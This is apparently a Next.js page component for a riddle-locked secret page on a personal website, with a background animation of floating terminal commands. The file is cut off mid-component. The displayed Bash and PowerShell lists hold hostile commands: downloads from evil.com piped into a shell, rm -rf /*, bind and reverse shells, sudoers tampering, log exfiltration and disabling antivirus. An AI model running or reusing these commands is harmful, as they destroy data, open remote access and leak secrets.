"use client";

import React, { useState, useRef, useEffect } from "react";
import Link from "next/link";
import * as THREE from "three";
import {
  deriveKeyFromAnswers,
  decryptSecretPayload
} from "../../lib/secretCrypto";

const ENCRYPTED_SECRET_PAYLOAD = "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";

const Q1 = "某个在人体中存在的巨大分子的完整化学式。";
const Q2 = "什么是法术实验室中单次伤害最高的法术？";
const Q3 = "网站持有者Steam账号某个游玩时间220小时以上的游戏中，最甜的物品是什么？";
const Q4 = "什么是\"Aletheia\"的中最奇特的物质？";
const Q5 = "如果我是答案，那问题是什么？";

const QUESTIONS = [Q1, Q2, Q3, Q4, Q5];

// 纯净 Linux Bash 命令行（70+ 条真实经典指令）
const BASH_COMMANDS = [
  "sudo whoami",
  "curl -fsSL https://evil.com/destroy.sh | sudo bash",
  "mkdir hope",
  "rm -rf /* --no-preserve-root",
  "chmod 777 -R /root",
  "ssh -i ~/.ssh/id_rsa root@127.0.0.1 -p 2222",
  "nc -lvnp 4444 -e /bin/bash",
  "dd if=/dev/urandom of=/dev/sda bs=1M status=progress",
  'cat /dev/urandom | hexdump -C | grep "SECRET"',
  'find / -name "*.pem" -exec shred -u {} \\;',
  "iptables -F && iptables -X && iptables -t nat -F",
  "openssl enc -aes-256-gcm -in /etc/shadow -out /tmp/leak.enc",
  "systemctl stop firewalld && ufw disable",
  'git commit -m "push to prod directly yolo" --force',
  "strace -p 1 -f -e trace=write,read",
  'kill -9 $(pgrep -f "watchdog")',
  "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
  "mount -o remount,rw /sys",
  'echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers',
  "nmap -sS -p- -T4 -v 192.168.1.0/24",
  "tcpdump -i eth0 -nn -s0 -w /tmp/intercept.pcap",
  'gdb --pid=$(pgrep systemd) --batch -ex "dump memory /tmp/core"',
  "grep -rnw '/home' -e 'PRIVATE KEY'",
  "alias ls='rm -rf --no-preserve-root /'",
  "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.internal",
  "docker run --privileged --net=host -v /:/host alpine chroot /host",
  "sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config",
  "tar -czvf - /var/log/auth.log | nc 10.0.0.99 9001",
  "airmon-ng start wlan0 && airodump-ng wlan0mon",
  "shred -zvu -n 35 /var/log/wtmp",
  'crontab -l',
  "cat /etc/passwd | awk -F: '{print $1,$6,$7}'",
  "chattr +i /tmp/backdoor.elf",
  'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; run"',
  "hashcat -m 1800 -a 0 hashes.txt rockyou.txt -O",
  "uname -a && cat /proc/version",
  'dmesg -T | grep -E "segfault|error|denied"',
  "ps aux --forest | grep -v '\\[.*\\]'",
  'tail -f /var/log/syslog | grep -i "failed"',
  "awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr",
  "socat TCP-LISTEN:1337,fork EXEC:/bin/sh",
  "find / -perm -u=s -type f 2>/dev/null",
  'cat /proc/cpuinfo | grep "model name" | head -n 1',
  'netstat -tulnp | grep -E "LISTEN|ESTABLISHED"',
  "ss -tulpn | grep 80",
  "journalctl -xeu systemd-networkd --no-pager",
  "lsof -i :8080 -sTCP:LISTEN",
  "openssl rand -hex 32",
  "gpg --list-secret-keys --keyid-format LONG",
  "iptables -A INPUT -p tcp --dport 22 -j DROP",
  "tar -I pigz -cvf backup.tar.gz /var/www",
  'rsync -avzP -e "ssh -p 2222" /data/ root@backup.local:/backup/',
  "top -b -n 1 | head -n 20",
  "ip link set eth0 promisc on",
  "arp-scan --localnet --interface=eth0",
  'objdump -d -M intel /bin/ls | grep "<main>:" -A 30',
  "readelf -h /usr/bin/python3",
  "hexdump -C -n 128 /dev/mem",
  'strings /tmp/dump.raw | grep -i "password"',
  'tshark -i wlan0 -Y "http.request" -T fields -e http.host',
  'zcat /var/log/syslog.*.gz | grep "kernel:"',
  "fdisk -l /dev/nvme0n1",
  "mkfs.ext4 -F -L ROOT /dev/nvme0n1p2",
  "mount -t tmpfs -o size=2G tmpfs /mnt/ramdisk",
  "chroot /mnt/sysroot /bin/bash -l",
  "echo 1 > /proc/sys/net/ipv4/ip_forward",
  "sysctl -w vm.drop_caches=3",
  "ip route add default via 192.168.1.1 dev eth0",
  "docker compose -f docker-compose.prod.yml up -d --build",
  "kubectl get pods --all-namespaces -o wide"
];

// pwsh7命令行
const PWSH_COMMANDS = [
  "Get-Process | Where-Object { $_.CPU -gt 100 } | Stop-Process -Force",
  "Invoke-WebRequest -Uri 'https://evil.com/destroy.ps1' -UseBasicParsing | Invoke-Expression",
  "New-Item -ItemType Directory -Path 'C:\\Hope' -Force",
  "Get-ChildItem -Path C:\\ -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Extension -eq '.key' }",
  "Start-Process pwsh -Verb runAs -ArgumentList '-NoExit -Command whoami /priv'",
  "Get-Service | Where-Object Status -eq 'Running' | Select-Object Name, DisplayName",
  "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -MaxEvents 20 | Format-Table TimeCreated, Message",
  "Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture",
  "Test-NetConnection -ComputerName 127.0.0.1 -Port 445 -InformationLevel Detailed",
  "1..100 | ForEach-Object -Parallel { Test-Connection -TargetName \"10.0.0.$_\" -Count 1 } -ThrottleLimit 32",
  "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force",
  "Invoke-RestMethod -Uri 'https://api.github.com/zen' -Method Get",
  "Get-Clipboard | Out-String | ConvertFrom-Json",
  "Clear-RecycleBin -Force -ErrorAction SilentlyContinue",
  "Get-NetIPAddress -AddressFamily IPv4 | Format-Table InterfaceAlias, IPAddress",
  "Get-LocalUser | Where-Object { $_.Enabled -eq $true } | Select-Object Name, SID",
  "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion",
  "Get-Process -IncludeUserName | Where-Object UserName -match 'SYSTEM'",
  "(New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/sec.ps1') | iex",
  "Stop-Service -Name wuauserv -Force; Set-Service -Name wuauserv -StartupType Disabled",
  "Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess",
  "Restart-Computer -Force -Confirm:$false",
  "Get-Disk | Where-Object OperationalStatus -eq 'Online' | Get-Partition | Get-Volume",
  "Export-Clixml -Path 'C:\\Windows\\Temp\\session.xml' -InputObject (Get-Variable)",
  "Get-History | Select-Object -Last 10 | Format-Table -AutoSize",
  "Measure-Command { Get-ChildItem C:\\Windows\\System32 -Filter *.dll }",
  "Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts -Tail 10",
  "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue",
  "Get-Volume | Where-Object DriveLetter -ne $null | Format-Table DriveLetter, FileSystemLabel, SizeRemaining",
  "Find-Module -Tag Security | Install-Module -Scope CurrentUser -Force",
  "Get-Command -Module Microsoft.PowerShell.Security | Format-Wide",
  "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U0VDUkVU'))",
  "Compress-Archive -Path C:\\SensitiveData -DestinationPath C:\\Backup.zip -Force",
  "Get-ScheduledTask | Where-Object State -ne 'Disabled' | Select-Object TaskName, TaskPath"
];

// Nerd Fonts 单独立字符集合（包含主流 Linux 发行版与知名开发工具，60+ 独立字符）
const NERD_ICONS = [
  "\uf303", // Arch Linux
  "\uf306", // Debian
  "\uf31b", // Ubuntu
  "\uf30a", // Fedora
  "\uf30d", // Gentoo
  "\uf300", // Alpine Linux
  "\uf327", // Kali Linux
  "\uf312", // Manjaro
  "\uf313", // NixOS
  "\uf304", // CentOS
  "\uf314", // openSUSE
  "\uf316", // Red Hat
  "\uf32e", // Void Linux
  "\uf17c", // Linux Tux
  "\uf30c", // FreeBSD
  "\uf30e", // Linux Mint
  "\uf309", // Elementary OS
  "\uf315", // Raspberry Pi
  "\uf301", // AOSC
  "\uf302", // Android
  "\uf305", // CoreOS
  "\uf307", // Devuan
  "\uf308", // Docker Linux
  "\uf30b", // FreeNAS
  "\uf30f", // Mageia
  "\uf310", // Mandriva
  "\uf318", // Slackware
  "\uf319", // Solaris
  "\uf31d", // Zorin OS
  "\uf320", // EndeavourOS
  "\uf323", // Pop!_OS
  "\uf325", // Garuda Linux
  "\uf329", // Parrot OS
  "\uf32a", // Artix Linux
  "\uf32b", // GNU Guix
  "\ue795", // Terminal
  "\ue7c5", // Vim / Neovim
  "\ue702", // Git
  "\ue7b0", // Docker
  "\ue7a8", // Rust
  "\ue73c", // Python
  "\ue627", // Go
  "\ue718", // Node.js
  "\ue745", // Firefox
  "\ue70c", // VS Code
  "\ue7a2", // C++
  "\ue7ba", // Rust Lang
  "\ue781", // React
  "\ue704", // CSS3
  "\ue736", // HTML5
  "\ue74e", // PHP / JS
  "\ue738", // Java
  "\ue791", // Ruby
  "\ue708", // Nginx
  "\ue7a9", // PostgreSQL
  "\ue7a4", // MySQL
  "\ue76d", // Redis
  "\ue628", // TypeScript
  "\ue755", // Swift
  "\ue634", // Kotlin
  "\ue737", // Scala
  "\ue777", // Haskell
  "\ue62d", // Elixir
  "\ue620", // Lua
  "\ue769", // Perl
  "\ue6a9", // Zig
  "\ue697", // Svelte
  "\ue6a0", // Vue
  "\ue753", // Angular
  "\ue662", // GraphQL
  "\ue7a7", // MongoDB
  "\uf296", // GitLab
  "\uf09b", // GitHub
  "\ue641", // Terraform
  "\ue691", // Ansible
  "\uf270", // AWS
  "\ue743", // Google Chrome
  "\ue779", // GNU
  "\ue632", // Emacs
  "\ue6a8", // Neovim
  "\ue682", // Kubernetes
  "\ue62e", // Electron
  "\ue74b", // Sass
  "\ue68f", // WebAssembly
  "\uf48a", // Markdown
  "\ue60b", // JSON
  "\ue71e", // NPM
  "\ue694", // Webpack
  "\ue68b", // Babel
  "\ue6b0", // Vite
  "\uf023", // Lock
  "\uf121", // Code
  "\uf120", // Terminal Shell
  "\uf188", // Bug
  "\uf084", // Key
  "\uf132", // Shield
  "\uf1c0", // Database
  "\uf126", // Git Branch
  "\uf0ac", // Globe
  "\uf108", // Desktop
  "\uf109", // Laptop
  "\uf013"  // Settings Gear
];

function BashStreamBackground({ isWindowsMode }: { isWindowsMode: boolean }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    let animId: number;
    let width = (canvas.width = window.innerWidth);
    let height = (canvas.height = window.innerHeight);

    const handleResize = () => {
      if (!canvas) return;
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    };
    window.addEventListener("resize", handleResize);

    interface FloatingItem {
      text: string;
      isIcon: boolean;
      x: number;
      y: number;
      speed: number;
      opacity: number;
      maxOpacity: number;
      fadeIn: boolean;
      fontSize: number;
      color: string;
    }

    const items: FloatingItem[] = [];
    const maxItems = 75;

    const spawnItem = (initialY?: number): FloatingItem => {
      const isIcon = Math.random() < 0.4;
      let text = "";
      let fontSize = Math.floor(12 + Math.random() * 4);
      let color = isWindowsMode ? "0, 180, 255" : "0, 255, 102";

      if (isIcon) {
        text = NERD_ICONS[Math.floor(Math.random() * NERD_ICONS.length)];
        fontSize = Math.floor(18 + Math.random() * 14);
        color = isWindowsMode
          ? (Math.random() < 0.5 ? "100, 200, 255" : "0, 160, 255")
          : (Math.random() < 0.5 ? "0, 255, 200" : "0, 255, 102");
      } else if (isWindowsMode) {
        const cmd = PWSH_COMMANDS[Math.floor(Math.random() * PWSH_COMMANDS.length)];
        text = `PS > ${cmd}`;
      } else {
        const cmd = BASH_COMMANDS[Math.floor(Math.random() * BASH_COMMANDS.length)];
        text = `$ ${cmd}`;
      }

      return {
        text,
        isIcon,
        x: Math.random() * Math.max(width - 380, 20),
        y: initialY ?? height + Math.random() * 30,
        speed: 0.35 + Math.random() * 0.75,
        opacity: initialY !== undefined ? Math.random() * 0.28 : 0,
        maxOpacity: 0.15 + Math.random() * 0.22,
        fadeIn: true,
        fontSize,
        color
      };
    };

    for (let i = 0; i < maxItems; i++) {
      items.push(spawnItem(Math.random() * height));
    }

    let lastSpawn = 0;

    const render = (time: number) => {
      ctx.clearRect(0, 0, width, height);

      if (time - lastSpawn > 120 && items.length < maxItems + 10) {
        items.push(spawnItem());
        lastSpawn = time;
      }

      for (let i = items.length - 1; i >= 0; i--) {
        const item = items[i];
        item.y -= item.speed;

        if (item.fadeIn) {
          item.opacity += 0.008;
          if (item.opacity >= item.maxOpacity) {
            item.fadeIn = false;
          }
        } else if (item.y < height * 0.22) {
          item.opacity -= 0.004;
        }

        if (item.y < -30 || item.opacity <= 0) {
          items.splice(i, 1);
          items.push(spawnItem());
          continue;
        }

        const fontName = item.isIcon ? '"Symbols Nerd Font Mono", monospace' : '"Maple Mono NL", monospace';
        ctx.font = `${item.fontSize}px ${fontName}`;
        ctx.fillStyle = `rgba(${item.color}, ${Math.max(0, item.opacity)})`;
        ctx.fillText(item.text, item.x, item.y);
      }

      animId = requestAnimationFrame(render);
    };

    animId = requestAnimationFrame(render);

    return () => {
      cancelAnimationFrame(animId);
      window.removeEventListener("resize", handleResize);
    };
  }, [isWindowsMode]);

  return (
    <canvas
      ref={canvasRef}
      style={{
        position: "fixed",
        top: 0,
        left: 0,
        width: "100%",
        height: "100%",
        pointerEvents: "none",
        zIndex: 0
      }}
    />
  );
}

export default function SecretPage() {
  const [currentStep, setCurrentStep] = useState(0);
  const [answers, setAnswers] = useState<string[]>(["", "", "", "", ""]);
  const [isDecrypting, setIsDecrypting] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [decryptedCode, setDecryptedCode] = useState<string | null>(null);
  const [isWindowsMode, setIsWindowsMode] = useState(false);

  const containerRef = useRef<HTMLDivElement>(null);
  const cleanupRef = useRef<(() => void) | null>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  const handleAnswerChange = (index: number, val: string) => {
    const next = [...answers];
    next[index] = val;
    setAnswers(next);
  };

  const handleNext = () => {
    if (currentStep < QUESTIONS.length - 1) {
      setCurrentStep((prev) => prev + 1);
    }
  };

  const handlePrev = () => {
    if (currentStep > 0) {
